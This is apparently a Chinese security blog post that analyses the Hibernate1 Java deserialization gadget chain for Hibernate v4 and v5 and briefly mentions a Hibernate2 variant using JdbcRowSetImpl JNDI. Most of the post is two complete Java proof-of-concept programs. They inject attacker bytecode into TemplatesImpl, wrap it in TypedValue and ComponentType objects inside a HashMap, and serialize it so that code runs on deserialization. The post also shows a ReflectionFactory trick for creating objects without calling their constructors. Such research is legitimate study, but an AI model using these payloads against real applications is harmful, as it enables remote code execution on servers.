---
title: "hibernate反序列化"
onlyTitle: true
date: 2025-12-30 15:10:21
toc: true
categories:
- java
- 框架漏洞
tags:
- hibernate
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8185.png
---



好久没写链子了，练手

# hibernate反序列化

Hibernate 是一个广泛使用的开源对象关系映射（ORM）框架，旨在简化 Java 应用程序与关系型数据库之间的数据交互。它通过将 Java 对象与数据库表关联起来，实现了对象的持久化，开发者无需编写繁琐的 SQL 语句即可操作数据库。

## Hibernate1

Hibernate1 gadget中对Hibernate v4和Hibernate v5做了不同的处理

### v4

v4版本通用

```
<dependency>
    <groupId>org.hibernate</groupId>
    <artifactId>hibernate-core</artifactId>
    <version>4.3.6.Final</version>
</dependency>
```

gadget：

```
HashMap.readObject()
	HashMap.hash()
		TypedValue.hashCode()
			ValueHolder<Integer>.getValue()
				DeferredInitializer<Integer>.initialize()
					ComponentType.getHashCode()
						ComponentType.getPropertyValue()
							PojoComponentTuplizer$AbstractComponentTuplizer.getPropertyValue()
								BasicPropertyAccessor$BasicGetter.get()
									Method(getOutputProperties).invoke(TemplatesImpl)
```

触发点位于BasicPropertyAccessor$BasicGetter.get，可以调用任意无参函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251229152436212.png)

本来之前觉得hashmap应该有无依赖触发到get的方法，原来只有触发到equals。。我这对CC的刻板映像啊。以后千万不能觉得无依赖能触发get函数了，只能触发equals和toString

AbstractComponentTuplizer#getPropertyValue能调用get，核心sink

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251229154236827.png)

AbstractComponentTuplizer是个抽象类，所以得找个父类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251229154417361.png)

后面照着链子串，除了Component变量的填充有点麻烦（懒），没什么好说的

额，写的时候发现有一处值得提一嘴。在initTransients有触发getHashCode的点。但是这里是把一个ValueHolder类赋值到了hashcode，而调用到这个重写的initialize()函数才会触发getHashCode。这是一个典型的延迟计算写法。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251229201033014.png)

延迟计算包装下的类，在调用getValue才会触发initialize()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251229204039703.png)

hashCode调用了getValue

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251229204134188.png)

所以最后得触发到hashCode，才能触发到getHashCode

```java
package org.exploit.third.hibernate;


import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.hibernate.cfg.Configuration;
import org.hibernate.cfg.Mappings;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.mapping.Component;
import org.hibernate.mapping.RootClass;
import org.hibernate.property.BasicPropertyAccessor;
import org.hibernate.property.Getter;
import org.hibernate.tuple.component.ComponentMetamodel;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.ComponentType;
import org.hibernate.type.TypeFactory;

import java.io.IOException;
import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;

//v4 final hibernate1
//HashMap.readObject()
//	HashMap.hash()
//		TypedValue.hashCode()
//			ValueHolder<Integer>.getValue()
//				DeferredInitializer<Integer>.initialize()
//					ComponentType.getHashCode()
//						ComponentType.getPropertyValue()
//							PojoComponentTuplizer$AbstractComponentTuplizer.getPropertyValue()
//								BasicPropertyAccessor$BasicGetter.get()
//									Method(getOutputProperties).invoke(TemplatesImpl)
public class hibernate1_v4 {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Class<?> BasicGetterClass = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
        Constructor<?> BasicGetterConstructor = BasicGetterClass.getDeclaredConstructor(Class.class, Method.class, String.class);
        BasicGetterConstructor.setAccessible(true);

        Method getOutputPropertiesMethod = TemplatesImpl.class.getMethod("getOutputProperties", null);
        Class<?> AbstractComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");
        Field getters = AbstractComponentTuplizerClass.getDeclaredField("getters");
        getters.setAccessible(true);

        Getter[] getter = new Getter[1];
        getter[0] = (Getter) BasicGetterConstructor.newInstance(TemplatesImpl.class,getOutputPropertiesMethod,"OutputProperties");

        Constructor<?> declaredConstructor = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer").getDeclaredConstructors()[0];
        declaredConstructor.setAccessible(true);

        Constructor<?> declaredConstructor2 = RootClass.class.getDeclaredConstructors()[0];
        declaredConstructor2.setAccessible(true);
        RootClass rootClass = (RootClass) declaredConstructor2.newInstance();
        Constructor<?> declaredConstructor3 = Class.forName("org.hibernate.cfg.Configuration$MappingsImpl").getDeclaredConstructors()[0];
        declaredConstructor3.setAccessible(true);
        Component component =  new Component((Mappings) declaredConstructor3.newInstance(new Configuration()),rootClass);
        component.setComponentClassName("java.util.HashMap");
        PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) declaredConstructor.newInstance(component);
        getters.set(pojoComponentTuplizer,getter);

        Constructor<?> declaredConstructor1 = Class.forName("org.hibernate.type.ComponentType").getDeclaredConstructors()[0];
        declaredConstructor1.setAccessible(true);
//        Constructor<?> declaredConstructor4 = Class.forName("org.hibernate.type.TypeFactory$TypeScopeImpl").getDeclaredConstructors()[0];
//        declaredConstructor4.setAccessible(true);
        TypeFactory typeFactory = new TypeFactory();
        Field typeScope = typeFactory.getClass().getDeclaredField("typeScope");
        typeScope.setAccessible(true);
        TypeFactory.TypeScope typeScope1 = (TypeFactory.TypeScope) typeScope.get(typeFactory);

        ComponentType componentType = (ComponentType) declaredConstructor1.newInstance(typeScope1,new ComponentMetamodel(component));

        Field componentTuplizer = Class.forName("org.hibernate.type.ComponentType").getDeclaredField("componentTuplizer");
        componentTuplizer.setAccessible(true);
        componentTuplizer.set(componentType,pojoComponentTuplizer);

        Field propertySpan = Class.forName("org.hibernate.type.ComponentType").getDeclaredField("propertySpan");
        propertySpan.setAccessible(true);

//        componentType.getHashCode(templatesClass);

        TypedValue typedValue = new TypedValue(componentType, templatesClass);
//        typedValue.hashCode();
        HashMap hashMap = new HashMap();
        hashMap.put(typedValue,"godown");
        propertySpan.set(componentType,1);
        serialize(hashMap);
        unserialize("ser.bin");

    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```



### v5

```xml
<dependency>
    <groupId>org.hibernate</groupId>
    <artifactId>hibernate-core</artifactId>
    <version>5.0.7.Final</version>
</dependency>
```

Gadget：

```
HashMap.readObject()
	HashMap.hash()
		TypedValue.hashCode()
			ValueHolder<Integer>.getValue()
				DeferredInitializer<Integer>.initialize()
					ComponentType.getHashCode()
						ComponentType.getPropertyValue()
							PojoComponentTuplizer$AbstractComponentTuplizer.getPropertyValue()
								GetterMethodImpl.get()		//差别就在这儿
									Method(getOutputProperties).invoke(TemplatesImpl)
```

sink从BasicPropertyAccessor$BasicGetter.get()变到了GetterMethodImpl.get()，更方便了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251230135015078.png)

RootClass也经过了修改，参数需要一个MetadataBuildingContext

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251230141417835.png)

这个类贼你妈难创建

用到了一个很NB的东西https://www.cnblogs.com/strongmore/p/15470175.html

ReflectionFactory类会绕过构造器来实例化对象，且会跳过类成员变量的初始化。屌爆了

使用方式：

```java
public static Object createObjWithoutConstructor(Class clazz) throws Exception{
    ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();
    Constructor<Object> constructor = Object.class.getDeclaredConstructor();
    Constructor<?> constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);
    constructor1.setAccessible(true);
    return constructor1.newInstance();
}
```

poc：

```java
package org.exploit.third.hibernate;

import com.caucho.db.Database;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.hibernate.boot.Metadata;
import org.hibernate.boot.internal.InFlightMetadataCollectorImpl;
import org.hibernate.boot.internal.MetadataBuilderImpl;
import org.hibernate.boot.internal.MetadataBuildingContextRootImpl;
import org.hibernate.boot.internal.MetadataImpl;
import org.hibernate.boot.jaxb.Origin;
import org.hibernate.boot.jaxb.SourceType;
import org.hibernate.boot.jaxb.hbm.spi.JaxbHbmHibernateMapping;
import org.hibernate.boot.model.source.internal.hbm.MappingDocument;
import org.hibernate.boot.registry.StandardServiceRegistry;
import org.hibernate.boot.registry.StandardServiceRegistryBuilder;
import org.hibernate.boot.spi.MetadataBuildingContext;
import org.hibernate.boot.spi.MetadataBuildingOptions;
import org.hibernate.cfg.Configuration;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.id.factory.spi.MutableIdentifierGeneratorFactory;
import org.hibernate.mapping.Component;
import org.hibernate.mapping.MappedSuperclass;
import org.hibernate.mapping.PersistentClass;
import org.hibernate.mapping.RootClass;
import org.hibernate.property.access.spi.Getter;
import org.hibernate.property.access.spi.GetterMethodImpl;
import org.hibernate.tuple.component.ComponentMetamodel;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.ComponentType;
import org.hibernate.type.TypeFactory;
import org.hibernate.type.TypeResolver;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;

import org.hibernate.boot.MetadataSources;
import sun.reflect.ReflectionFactory;

//v4-final hibernate1
//HashMap.readObject()
//	HashMap.hash()
//		TypedValue.hashCode()
//			ValueHolder<Integer>.getValue()
//				DeferredInitializer<Integer>.initialize()
//					ComponentType.getHashCode()
//						ComponentType.getPropertyValue()
//							PojoComponentTuplizer$AbstractComponentTuplizer.getPropertyValue()
//								GetterMethodImpl.get()		//差别就在这儿
//									Method(getOutputProperties).invoke(TemplatesImpl)
public class hibernate1_v5 {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }

        Method getOutputPropertiesMethod = TemplatesImpl.class.getMethod("getOutputProperties", null);
        Class<?> AbstractComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");
        Field getters = AbstractComponentTuplizerClass.getDeclaredField("getters");
        getters.setAccessible(true);

        Getter[] getter = new Getter[1];
        getter[0] = new GetterMethodImpl(TemplatesImpl.class,"OutputProperties",getOutputPropertiesMethod);

        PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class);

        getters.set(pojoComponentTuplizer,getter);

        ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class);

        Field componentTuplizer = Class.forName("org.hibernate.type.ComponentType").getDeclaredField("componentTuplizer");
        componentTuplizer.setAccessible(true);
        componentTuplizer.set(componentType,pojoComponentTuplizer);

//        componentType.getHashCode(templatesClass);

        TypedValue typedValue = new TypedValue(componentType, templatesClass);
//        typedValue.hashCode();
        HashMap hashMap = new HashMap();
        hashMap.put(typedValue,"godown");
        Field propertySpan = Class.forName("org.hibernate.type.ComponentType").getDeclaredField("propertySpan");
        propertySpan.setAccessible(true);
        propertySpan.set(componentType,1);
        serialize(hashMap);
        unserialize("ser.bin");

    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
    public static Object createObjWithoutConstructor(Class clazz) throws Exception{
        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();
        Constructor<Object> constructor = Object.class.getDeclaredConstructor();
        Constructor<?> constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);
        constructor1.setAccessible(true);
        return constructor1.newInstance();
    }
}

```



ReflectionFactory牛逼，顶级姿势



### hibernate 2

打JdbcRowSetImpl jndi

fastjson 用的setter，因为parse只能调用setter，调用getter需要parseObject，没那么通用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251230150512108.png)

实际上我们打开项目搜索connect，getDatabaseMetaData这个getter也是可以触发connect打jndi的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251230150815365.png)

所以hibernate2只是从getOutputProperties改到了getDatabaseMetaData，由于要贴v4和v5两个版本，我干脆不贴了。





